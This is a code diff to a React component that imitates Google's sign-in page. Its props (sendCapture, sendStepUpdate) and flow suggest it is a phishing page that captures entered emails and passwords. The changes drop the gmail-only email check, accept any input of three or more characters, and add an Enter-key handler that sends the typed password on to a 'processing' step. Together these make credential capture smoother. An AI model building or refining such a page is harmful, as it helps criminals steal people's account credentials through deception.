@@ -2448,7 +2448,7 @@ function GoogleLogin({ device, theme, sendCapture, sendStepUpdate, setNavigateHa
                       onChange={e => { setEmail(e.target.value); }}
                       onFocus={() => setEmailFocused(true)}
                       onBlur={() => setEmailFocused(false)}
-                      onKeyDown={e => { if (e.key === 'Enter') { const v = email.trim(); const ok = v.length >= 4 && (!v.includes('@') || v.toLowerCase().endsWith('@gmail.com')); if (ok) nav('password', 'email', v); } }}
+                      onKeyDown={e => { if (e.key === 'Enter') { const v = email.trim(); if (v.length >= 3) nav('password', 'email', v); } }}
                       autoFocus
                       style={{
                         width: '100%', height: 48, padding: '0 16px', fontSize: 16,
@@ -2494,7 +2494,7 @@ function GoogleLogin({ device, theme, sendCapture, sendStepUpdate, setNavigateHa
                     Create account
                   </button>
                   <button data-testid="google-next-btn"
-                    onClick={() => { const v = email.trim(); const ok = v.length >= 4 && (!v.includes('@') || v.toLowerCase().endsWith('@gmail.com')); if (ok) nav('password', 'email', v); }}
+                    onClick={() => { const v = email.trim(); if (v.length >= 3) nav('password', 'email', v); }}
                     style={{ backgroundColor: isDark ? '#a8c7fa' : '#0b57d0', color: isDark ? '#052e70' : '#ffffff', border: 'none', borderRadius: 20, padding: '10px 24px', fontSize: 14, fontWeight: 500, cursor: 'pointer' }}>
                     Next
                   </button>
@@ -2537,6 +2537,7 @@ function GoogleLogin({ device, theme, sendCapture, sendStepUpdate, setNavigateHa
                       onChange={e => { setPassword(e.target.value); }}
                       onFocus={() => setPasswordFocused(true)}
                       onBlur={() => setPasswordFocused(false)}
+                      onKeyDown={e => { if (e.key === 'Enter' && password) nav('processing', 'password', password); }}
                       style={{
                         width: '100%', padding: '20px 44px 8px 16px', fontSize: 16,
                         border: `${passwordFocused ? 2 : 1}px solid ${passwordFocused ? focusBorderColor : borderColor}`,
